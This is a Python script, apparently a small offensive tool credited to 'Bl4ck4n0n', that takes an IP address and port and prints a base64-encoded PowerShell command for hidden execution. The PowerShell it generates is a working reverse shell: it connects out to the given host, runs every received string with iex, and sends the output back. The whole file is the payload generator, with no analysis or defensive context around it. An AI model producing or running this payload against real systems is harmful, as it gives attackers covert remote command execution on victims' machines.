import sys
import base64

if len(sys.argv) != 3:
    sys.exit(0)

ip = sys.argv[1]
try:
    port = int(sys.argv[2])
    if not (1 <= port <= 65535):
        sys.exit(0)
except:
    sys.exit(0)

ps_code = (
    f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{0};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);"
    "$stream.Flush()};"
    "$client.Close()"
)

# Encode as UTF-16LE then base64 (exactly how PowerShell -EncodedCommand expects it)
utf16_bytes = ps_code.encode('utf-16le')
b64 = base64.b64encode(utf16_bytes).decode('ascii')

print("Author: Bl4ck4n0n Version: 1.0\n")
print(f"[INPUT] Parameters: {ip}, {port}")
print("[INFO] Payload below:\n")
print(f"powershell -nop -w hidden -e {b64}")
